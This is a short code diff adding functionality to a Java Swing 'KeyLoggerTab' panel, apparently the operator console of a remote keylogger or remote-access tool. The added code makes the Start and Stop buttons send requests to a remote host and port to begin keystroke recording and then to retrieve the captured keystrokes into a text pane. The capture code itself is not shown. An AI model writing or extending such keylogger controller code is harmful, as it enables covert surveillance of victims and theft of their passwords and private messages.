@@ -23,6 +23,9 @@ import java.awt.Font;
 import javax.swing.JPanel;
 import javax.swing.SwingConstants;
 
+import KeyLogger.KeyLoggerStart;
+import KeyLogger.KeyLoggerStop;
+
 
 
 public class KeyLoggerTab extends JInternalFrame {
@@ -52,7 +55,8 @@ public class KeyLoggerTab extends JInternalFrame {
 		btnStart.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				if(!isRecord) {
-				
+					KeyLoggerStart keyLoggerStart = new KeyLoggerStart(host, port);
+					keyLoggerStart.sendRequest();
 					isRecord = true;
 				}
 			}
@@ -64,7 +68,10 @@ public class KeyLoggerTab extends JInternalFrame {
 		btnStop.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				if(isRecord) {
-					
+					KeyLoggerStop keyLoggerStop = new KeyLoggerStop(host, port);
+					keyLoggerStop.sendRequest();
+					String data = (String) keyLoggerStop.getResponseData();
+					textPane.setText(data);
 					isRecord = false;
 				}
 			}
